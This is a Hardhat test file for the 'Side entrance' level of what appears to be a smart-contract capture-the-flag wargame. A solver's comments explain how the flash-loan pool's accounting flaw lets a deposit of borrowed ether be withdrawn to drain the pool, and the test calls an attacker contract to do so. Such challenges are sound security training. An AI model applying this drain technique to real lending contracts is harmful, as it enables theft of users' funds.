const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        //Our pool has an exploitable external call inside its flashloan function, that will call our attacker contract,
        //implementing the interfaced execute() function. The last require statement of flashloan() does not complain 
        //if the total balance itself is the same as before. Via the external call, we are able to trick balances
        //of our attacker contract to match the total amount deposited by the deployer. 
        //After that, we can withdraw all that amount and forward it to our attacker address. 

        const attackerFactory = await ethers.getContractFactory('SideEntranceLenderPoolAttacker');
        const attackerContract = await attackerFactory.deploy(this.pool.address, attacker.address);
        console.log("initial  balance", (await ethers.provider.getBalance(this.pool.address)).toString())
        await attackerContract.connect(attacker).attack(ETHER_IN_POOL);
        await attackerContract.connect(attacker).withdrawAndSend();
        console.log("final pool balance ",(await ethers.provider.getBalance(this.pool.address)).toString())
        console.log("final attacker balance ",(await ethers.provider.getBalance(attacker.address)).toString())
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
